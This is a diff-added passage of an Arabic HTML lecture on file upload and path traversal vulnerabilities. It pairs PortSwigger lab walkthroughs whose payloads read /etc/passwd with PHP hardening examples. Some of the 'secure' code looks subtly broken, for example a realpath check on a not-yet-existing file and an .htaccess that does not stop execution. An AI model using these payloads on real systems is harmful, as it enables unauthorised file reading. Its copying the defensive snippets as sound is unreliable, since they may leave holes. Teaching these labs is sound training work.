+                    <li>احاول استخدام ../ ولاحظ أنه محظور</li>
+                    <li>غير filename إلى المسار المطلق: <code>/etc/passwd</code></li>
+                    <li>احصل على محتوى الملف مباشرة</li>
+                </ol>
+            </div>
+
+            <!-- Lab 3 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 3: File path traversal, validation of start of path
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تجاوز فحص بداية المسار المطلوبة.</p>
+                
+                <ol class="step-list">
+                    <li>لاحظ أن التطبيق يتوقع بداية معينة للمسار</li>
+                    <li>استخدم: <code>/var/www/images/../../../etc/passwd</code></li>
+                    <li>ابدأ بالمسار المطلوب ثم انتقل للملف المستهدف</li>
+                </ol>
+            </div>
+
+            <!-- Lab 4 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 4: File path traversal, traversal sequences stripped non-recursively
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تجاوز الفلتر الذي يحذف ../ مرة واحدة فقط.</p>
+                
+                <ol class="step-list">
+                    <li>احاول ../ ولاحظ أنه يتم حذفه</li>
+                    <li>استخدم nested sequences: <code>....//....//....//etc/passwd</code></li>
+                    <li>بعد حذف ../ الأولى، ستبقى ../ أخرى تعمل</li>
+                </ol>
+            </div>
+
+            <!-- Lab 5 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 5: File path traversal, traversal sequences stripped with superfluous URL-decode
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تجاوز الفلتر باستخدام Double URL Encoding.</p>
+                
+                <ol class="step-list">
+                    <li>احاول ../ و %2e%2e%2f ولاحظ أنهما محظوران</li>
+                    <li>استخدم Double URL encoding: <code>..%252f..%252f..%252fetc/passwd</code></li>
+                    <li>الفلتر يفحص المدخل ثم يطبق URL decode مرة أخرى</li>
+                </ol>
+            </div>
+
+            <!-- Lab 6 -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 6: File path traversal, validation of file extension with null byte bypass
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تجاوز فحص امتداد الملف باستخدام Null Byte.</p>
+                
+                <ol class="step-list">
+                    <li>احاول ../../../etc/passwd ولاحظ رفض عدم وجود امتداد صورة</li>
+                    <li>استخدم Null Byte: <code>../../../etc/passwd%00.png</code></li>
+                    <li>الفحص يرى .png لكن النظام يتوقف عند %00</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- طرق الحماية -->
+        <div id="prevention" class="section">
+            <h2 class="section-title"><i class="fas fa-shield-virus"></i> طرق الحماية</h2>
+
+            <h3 class="subsection-title"><i class="fas fa-upload"></i> حماية File Upload</h3>
+            
+            <div class="highlight-box">
+                <h4><i class="fas fa-check-circle"></i> 1. فحص امتداد الملف (Whitelist)</h4>
+                <div class="code-example secure-code">
+                    <pre><code class="language-php">// حماية صحيحة
+$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
+$file_extension = strtolower(pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION));
+
+if (!in_array($file_extension, $allowed_extensions)) {
+    die('نوع الملف غير مسموح');
+}
+
+// فحص MIME type إضافي
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$mime_type = finfo_file($finfo, $_FILES['upload']['tmp_name']);
+$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
+
+if (!in_array($mime_type, $allowed_mimes)) {
+    die('نوع الملف غير صحيح');
+}</code></pre>
+                </div>
+            </div>
+
+            <div class="highlight-box">
+                <h4><i class="fas fa-check-circle"></i> 2. فحص محتوى الملف</h4>
+                <div class="code-example secure-code">
+                    <pre><code class="language-php">// التحقق من Magic Bytes
+function isValidImage($file_path) {
+    $handle = fopen($file_path, 'rb');
+    $bytes = fread($handle, 4);
+    fclose($handle);
+    
+    // JPEG: FF D8 FF
+    // PNG: 89 50 4E 47
+    // GIF: 47 49 46 38
+    
+    $jpeg = [0xFF, 0xD8, 0xFF];
+    $png = [0x89, 0x50, 0x4E, 0x47];
+    $gif = [0x47, 0x49, 0x46, 0x38];
+    
+    $file_bytes = unpack('C*', $bytes);
+    
+    return (array_slice($file_bytes, 0, 3) === $jpeg ||
+            array_slice($file_bytes, 0, 4) === $png ||
+            array_slice($file_bytes, 0, 4) === $gif);
+}</code></pre>
+                </div>
+            </div>
+
+            <div class="highlight-box">
+                <h4><i class="fas fa-check-circle"></i> 3. إعادة تسمية الملفات وتأمين المسار</h4>
+                <div class="code-example secure-code">
+                    <pre><code class="language-php">// إعادة تسمية آمنة
+$safe_filename = bin2hex(random_bytes(16)) . '.' . $file_extension;
+$upload_dir = '/var/www/uploads/';
+
+// منع Path Traversal
+$safe_path = realpath($upload_dir . $safe_filename);
+if (!$safe_path || !str_starts_with($safe_path, realpath($upload_dir))) {
+    die('مسار غير آمن');
+}
+
+// نقل الملف
+move_uploaded_file($_FILES['upload']['tmp_name'], $safe_path);
+
+// إعداد .htaccess لمنع التنفيذ
+file_put_contents($upload_dir . '.htaccess', 
+    "Options -ExecCGI\n" .
+    "AddHandler cgi-script .php .pl .py .jsp .asp .sh .cgi\n" .
+    "Options -Indexes"
+);</code></pre>
+                </div>
+            </div>
+
+            <h3 class="subsection-title"><i class="fas fa-folder-open"></i> حماية Path Traversal</h3>
+            
+            <div class="highlight-box">
+                <h4><i class="fas fa-check-circle"></i> 1. تنظيف المدخلات</h4>
+                <div class="code-example secure-code">
+                    <pre><code class="language-php">function sanitizePath($user_input) {
+    // إزالة null bytes
+    $clean = str_replace("\0", '', $user_input);
+    
+    // إزالة traversal sequences
+    $clean = str_replace(['../', '..\\', '..', './'], '', $clean);
+    
+    // إزالة المسارات المطلقة
+    $clean = ltrim($clean, '/\\');
+    
+    // فحص الأحرف المسموحة فقط
+    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $clean)) {
+        throw new Exception('أحرف غير مسموحة في اسم الملف');
+    }
+    
+    return $clean;
+}</code></pre>
+                </div>
+            </div>
+
+            <div class="highlight-box">
+                <h4><i class="fas fa-check-circle"></i> 2. استخدام Whitelist للملفات المسموحة</h4>
+                <div class="code-example secure-code">
+                    <pre><code class="language-php">// قائمة بيضاء بالملفات المسموحة
+$allowed_files = [
+    'product1.jpg',
+    'product2.jpg',
+    'banner.png',
+    'logo.gif'
+];
+
+$requested_file = $_GET['file'];
+
+if (!in_array($requested_file, $allowed_files)) {
+    http_response_code(404);
+    die('الملف غير موجود');
+}
+
+$safe_path = '/var/www/images/' . $requested_file;
+readfile($safe_path);</code></pre>
+                </div>
+            </div>
+
+            <div class="highlight-box">
+                <h4><i class="fas fa-check-circle"></i> 3. استخدام realpath() للتحقق من المسار</h4>
+                <div class="code-example secure-code">
+                    <pre><code class="language-php">$base_dir = '/var/www/uploads/';
+$user_file = sanitizePath($_GET['file']);
+$full_path = $base_dir . $user_file;
+
+// الحصول على المسار الحقيقي
+$real_path = realpath($full_path);
+
+// التحقق من أن الملف داخل الدليل المسموح
+if (!$real_path || !str_starts_with($real_path, realpath($base_dir))) {
+    http_response_code(403);
+    die('الوصول مرفوض');
+}
+
+// التحقق من وجود الملف
+if (!file_exists($real_path)) {
+    http_response_code(404);
+    die('الملف غير موجود');
+}
+
+readfile($real_path);</code></pre>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> تحذيرات مهمة</h4>
+                <ul>
+                    <li>لا تعتمد على فحص امتداد الملف فقط</li>
+                    <li>احذر من Double URL Encoding</li>
+                    <li>استخدم صلاحيات ملفات محدودة</li>
+                    <li>فعل Web Application Firewall (WAF)</li>
+                    <li>راقب ملفات الـ logs للأنشطة المشبوهة</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- الخلاصة -->
+        <div id="conclusion" class="conclusion">
+            <h2><i class="fas fa-trophy"></i> خلاصة المحاضرة</h2>
+            
+            <div class="highlight-box">
+                <h4><i class="fas fa-check-circle"></i> النقاط الرئيسية المكتسبة</h4>
+                <ul>
+                    <li><strong>7 أنواع</strong> من ثغرات File Upload وطرق استغلالها</li>
+                    <li><strong>6 تقنيات</strong> Path Traversal لتجاوز الحماية</li>
+                    <li><strong>13 مختبر عملي</strong> من PortSwigger لإتقان التقنيات</li>
+                    <li><strong>Web Shell Development</strong> للسيطرة على الخوادم</li>
+                    <li><strong>طرق الحماية الشاملة</strong> لتأمين التطبيقات</li>
+                </ul>
+            </div>
+
+            <div class="tips-box">
+                <h4><i class="fas fa-lightbulb"></i> نصائح متقدمة للممارسين</h4>
+                <ul>
+                    <li>اجمع بين File Upload وPath Traversal للحصول على تأثير أقوى</li>
+                    <li>استخدم Polyglot Files (PHP/Image) لتجاوز عدة فحوصات</li>
+                    <li>اختبر جميع نقاط رفع الملفات في التطبيق</li>
+                    <li>ابحث عن ملفات الإعداد الحساسة (.env, config.php)</li>
+                    <li>استغل Race Conditions في معالجة الملفات</li>
+                </ul>
+            </div>
+
+            <p>🔥 <strong>تذكر:</strong> ثغرات File Upload وPath Traversal من أخطر الثغرات لأنها تتيح الوصول المباشر للخادم والملفات الحساسة. الممارسة المستمرة على المختبرات ستجعلك خبيراً في اكتشاف واستغلال هذه الثغرات!</p>
+
+            <a href="../index.html" class="back-home">
+                <i class="fas fa-home"></i> العودة للصفحة الرئيسية
+            </a>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/plugins/autoloader/prism-autoloader.min.js"></script>
+</body>
+</html> 
